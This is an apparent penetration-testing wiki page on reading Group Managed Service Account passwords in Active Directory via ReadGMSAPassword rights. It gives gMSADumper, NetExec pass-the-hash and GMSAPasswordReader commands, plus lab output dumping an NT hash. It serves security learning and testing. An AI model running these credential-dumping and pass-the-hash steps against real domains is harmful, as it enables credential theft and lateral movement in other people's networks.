---
title: Group Managed Service Account
description: Read the NT password hash of Group Managed Service Accounts (gMSA)
categories: [Active Directory, Privilege Escalation]
tags: [Active Directory, Privilege Escalation, Lateral Movement, ACL Abuse, Group Managed Service Account]
weight: 2
---

**Managed Service Accounts (MSAs)** and later **Group Managed Service Accounts (gMSAs)** simplify service account password management. Their long, automatically generated passwords also resist attacks such as Kerberoasting. While both support automatic password generation and rotation, the latter allows the same service account to be used across different machines.

The principals allowed to retrieve a gMSA's managed password are configured through `PrincipalsAllowedToRetrieveManagedPassword`, commonly using a group containing the computer accounts where the service will run. These principals can read `msDS-ManagedPassword` and derive the account's NT hash (`ReadGMSAPassword` in BloodHound); this is password retrieval access, not general management of the gMSA.


In the demo below, the machine account `MSN-04-SAZABI$` is part of the `WEBSERVERS` group, which is allowed to retrieve the managed password of `GMSAWEBAPP$`. The `WEBSERVERS` group has `ReadGMSAPassword` access over the gMSA.

![](/img/gmsa/gmsa_bh.png)

If an attacker gains admin access on one of the machines whose machine account is part of the management group, the attacker can dump the machine account hash, then use Pass-the-Hash to authenticate and read the password of the gMSA, expanding their access to all services running under the service account.

## Linux Perspective
From a Linux attacker machine, [gMSADumper](https://github.com/micahvandeusen/gMSADumper) may be used to read the managed password and derive its NT hash:
```bash
gMSADumper.py -u <machine_account> -p :<machine_account_nt_hash> -d <domain>
```

Alternatively, we may use **NetExec** with the `--gmsa` option over LDAP to read the password of the gMSA.
```bash
nxc ldap <dc_ip> -u <machine_account> -H <machine_account_nt_hash> --gmsa
```
```shell-session
╭─brian@rx-93-nu /tmp/tmp.1hRpZm4tin
╰─$ nxc ldap 10.10.0.3 -u 'MSN-04-SAZABI$' -H 7e7468ada27ecd41c2650c4c06aa9163 --gmsa
LDAP        10.10.0.3       389    RA-CAILUM        [*] Windows 11 / Server 2025 Build 26100 (name:RA-CAILUM) (domain:GUNDAM.local) (signing:Enforced) (channel binding:When Supported)
LDAP        10.10.0.3       389    RA-CAILUM        [+] GUNDAM.local\MSN-04-SAZABI$:7e7468ada27ecd41c2650c4c06aa9163
LDAP        10.10.0.3       389    RA-CAILUM        [*] Getting GMSA Passwords
LDAP        10.10.0.3       389    RA-CAILUM        Account: gmsaWebApp$          NTLM: 971c7366c83e670d8a9fc44b55836aa2     PrincipalsAllowedToReadPassword: WebServers
```

## Windows Perspective
From a Windows machine, [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) may be used to achieve the same.
```cmd
.\gmsapasswordreader.exe --accountname <gmsa_account>
```
